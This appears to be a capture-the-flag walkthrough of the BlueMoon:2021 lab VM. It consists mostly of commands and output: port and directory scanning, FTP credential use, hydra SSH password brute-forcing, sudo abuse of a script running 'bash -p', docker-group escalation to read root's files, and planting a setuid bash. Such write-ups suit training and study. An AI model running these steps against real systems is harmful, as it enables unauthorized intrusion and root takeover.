└─$ sudo nmap  -sT -A -Pn -n 192.168.110.12
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 10:29 CEST
Nmap scan report for 192.168.110.12
Host is up (0.00075s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 2c:e2:63:78:bc:55:fe:f3:cb:09:a9:d8:26:2f:cb:d5 (RSA)
|   256 c4:c8:6b:48:92:25:a5:f7:00:9f:ab:b2:56:d5:ed:dc (ECDSA)
|_  256 a9:5b:39:a1:6e:05:91:0f:75:3c:88:0b:55:7c:a8:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: BlueMoon:2021
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:04:C6:1A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 192.168.110.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds


```bash
gobuster dir -u http://192.168.110.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/server-status        (Status: 403) [Size: 279]
/hidden_text          (Status: 200) [Size: 1169]

```

```txt
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   --sc 200 http://192.168.110.12/FUZZ

Target: http://192.168.110.12/FUZZ
Total requests: 220560

"http://192.168.110.12/"
000206056:   200        45 L     109 W      1169 Ch     "hidden_text"
```

QR Code

```bash
#!/bin/bash
HOST=ip
USER=userftp
PASSWORD=ftpp@ssword
ftp -inv $HOST user $USER $PASSWORD
```

```bash
ftp userftp@192.168.110.12
Connected to 192.168.110.12.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42425|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Mar 08  2021 information.txt
-rw-r--r--    1 0        0             363 Mar 08  2021 p_lists.txt
```

```console
$ cat information.txt                                                                                                                                     
Hello robin ...!
    
    I'm Already Told You About Your Password Weekness. I will give a Password list. you May Choose Anyone of The Password.

$ cat p_lists.txt 
h4ck3rp455wd
4dm1n
Pr0h4ck3r
5cr1ptk1dd3
pubgpr0pl4yer
H34d5h00t3r
...
```

```console
└─$ hydra -l robin -P p_lists.txt ssh://192.168.110.12
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-01 15:05:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:1/p:32), ~2 tries per task
[DATA] attacking ssh://192.168.110.12:22/
[22][ssh] host: 192.168.110.12   login: robin   password: k4rv3ndh4nh4ck3r
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-01 15:05:26

```

```console
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:111::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
userftp:x:1001:1001::/home/userftp:/bin/sh
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
jerry:x:1002:1002::/home/jerry:/bin/bash

```
```console
robin@BlueMoon:~/project$ sudo -l
Matching Defaults entries for robin on bluemoon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on bluemoon:
    (jerry) NOPASSWD: /home/robin/project/feedback.sh

```
```bash
robin@BlueMoon:~/project$ cat /home/robin/project/feedback.sh
#!/bin/bash
/bin/bash -p
```
```bash
robin@BlueMoon:~/project$ sudo -u jerry /home/robin/project/feedback.sh
jerry@BlueMoon:/home/robin/project$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
```

```bash
docker run -v /root:/mnt -it alpine
```
```console
jerry@BlueMoon:/home/robin/project$ docker run -v /root:/mnt -it alpine
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # cat /mnt/root.txt 

==> Congratulations <==

You Reached Root...!

Root-Flag 
    
     Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}

Created By 
       
        Kirthik - Karvendhan
                    
 
instagram = ____kirthik____



!......Bye See You Again......!

/ # 

```

```console
jerry@BlueMoon:/home/robin$ cp /usr/bin/bash /tmp/
jerry@BlueMoon:/home/robin$ docker run -v /tmp:/mnt -it alpine
/ # chown  root.root /mnt/bash 
/ # chmod 4755 /mnt/bash 
/ # exit
jerry@BlueMoon:/home/robin$ /tmp/bash -p
bash-5.0# id
uid=1002(jerry) gid=1002(jerry) euid=0(root) groups=1002(jerry),114(docker)
bash-5.0# whoami
root
```
